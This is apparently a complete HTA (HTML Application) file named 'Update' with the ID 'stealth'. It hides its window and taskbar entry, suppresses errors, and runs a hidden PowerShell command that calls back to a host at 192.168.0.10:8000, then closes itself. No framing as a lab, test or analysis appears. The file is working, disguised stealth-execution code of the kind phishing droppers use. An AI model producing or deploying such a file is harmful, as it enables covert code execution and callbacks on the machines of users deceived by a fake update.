<html>
<head>
    <HTA:APPLICATION 
        ID="stealth"
        APPLICATIONNAME="Update"
        BORDER="none"
        CAPTION="no"
        SHOWINTASKBAR="no"
        SINGLEINSTANCE="yes"
        SYSMENU="no"
        WINDOWSTATE="minimize"
    >
    <script language="VBScript">
        On Error Resume Next
        Set shell = CreateObject("WScript.Shell")
        shell.Run "cmd /c powershell -w hidden -nop -c Invoke-WebRequest http://192.168.0.10:8000/ping", 0, False
        self.close
    </script>
</head>
<body></body>
</html>
